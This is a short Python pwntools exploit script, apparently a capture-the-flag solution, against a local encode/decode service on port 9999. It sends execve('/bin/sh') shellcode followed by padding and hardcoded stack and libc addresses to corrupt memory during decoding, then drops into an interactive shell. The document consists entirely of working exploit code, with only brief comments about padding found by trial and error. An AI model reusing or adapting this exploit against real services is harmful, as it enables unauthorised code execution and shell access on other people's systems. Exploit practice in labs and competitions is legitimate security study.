from pwn import *

target = remote("127.0.0.1", 9999)

def encode(data, length):
	target.recvuntil("> ")
	target.sendline(str(1))
	target.recvuntil(": ")
	target.sendline(str(length))
	target.recvuntil(": ")
	target.send(data)


def decode(data, length):
	target.recvuntil("> ")
	target.sendline(str(2))
	target.recvuntil(": ")
	target.sendline(str(length))
	target.recvuntil(": ")
	target.send(data)

#shellcode, should be untouched
buf = b"\x1a\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf += b"\x81\x70"*22 #decoded pad - such that the decompression rate is very high
buf += b"\x98\x70"
#Most of this is unnecessary. This exploit took many tries, and the offset of the decoded buffer changes with input length, so most of the fields are unnecessary, but removing them would make me need to readjust the padding
buf += b"\x6b" + p32(0xb8) + p64(0x4052a0) + p64(0x00007ffff7fbeb80) + p32(0x41424344)+ p32(0x41424344) + p64(0x6b0000000000006d) + p64(0x00007fffffffe0c8) + p64(0x7fffffffe090) + p64(0x7fffffffe090) + p64(0x0000003800000178) + p64(0xff00009000000bdc) + p64(0x9000000000401a10) + p64(0x7fffffffe0) + p64(0x7fffffffe090) + p64(0x7fffffff0000)


decode(buf, len(buf) + 1)
target.interactive()
print(target.recvline())

target.interactive()
